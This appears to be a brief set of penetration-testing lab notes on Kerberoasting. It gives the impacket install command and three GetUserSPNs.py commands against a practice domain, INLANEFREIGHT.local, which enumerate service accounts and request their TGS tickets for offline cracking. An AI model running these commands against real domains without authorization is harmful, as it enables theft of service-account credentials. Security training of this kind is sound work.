# Installing impacket using Pip

sudo python3 -m pip install impacket

# Using GetUserSPNs.py

## Searching SPNs User account (kerberoast accounts)

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.local/forend

## Searching TGS ticket

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.local/forend -request

## Searching TGS ticket with specific user

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.local/forend -request-user sqldev

